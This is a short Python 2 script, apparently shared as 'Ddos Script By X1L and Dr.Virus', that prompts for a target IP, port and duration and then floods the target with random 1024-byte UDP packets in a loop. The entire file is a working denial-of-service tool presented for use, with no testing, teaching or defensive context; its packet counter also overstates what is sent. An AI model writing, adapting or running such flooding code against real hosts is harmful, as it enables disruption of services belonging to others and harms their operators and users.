import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("clear")
print ("Ddos Script By X1L and Dr.Virus")
print (" ")
ip = raw_input("Target IP: ")
port = input("Port: ")
dur= input("Time: ")
timeout = time.time() + dur
sent = 0

while True:
        try:
                if time.time() > timeout:
                        break
                else:
                        pass
                sock.sendto(bytes,(ip, port))
                sent = sent + 999
                print("Send %s packets to %s through port %s") , sent, ip, port
        except KeyboardInterrupt:
               sys.exit()
